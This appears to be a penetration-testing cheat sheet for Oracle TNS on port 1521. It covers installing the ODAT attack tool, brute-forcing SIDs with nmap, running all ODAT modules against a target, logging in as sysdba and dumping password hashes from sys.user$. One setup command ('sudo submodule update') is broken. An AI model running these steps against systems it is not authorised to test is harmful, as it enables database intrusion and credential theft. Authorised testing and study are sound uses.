`Oracle Transparent Network Substrate (TNS)` server is a communication protocol that facilitates communication between Oracle databases and applications over networks.

## Set up
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

- Test to see if the installation is successful
```bash
./odat.py -h
```

## ENUMERATION
- nmap
```bash
sudo nmap -sV -p1521 $IP --open --script oracle-sid-brute
``` 

- odat
```bash
sudo ./odat.py all -s $IP 
```

## Log in with sqlplus
- Once credentials are found we try to log in
```bash
sqlplus $USER/$PASSWORD@$IP/$ORACLE_SID
```

Note: if we get error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, run:
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

- Login with user as the System Database Admin (`sysdba`)
```bash
sqlplus $USER/$PASSWORD@$IP/$ORACLE_SID as sysdba
```

## Interact with Oracle RDBMS database
```bash
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
SQL> select * from user_role_privs;
SQL> select name, password from sys.user$;
```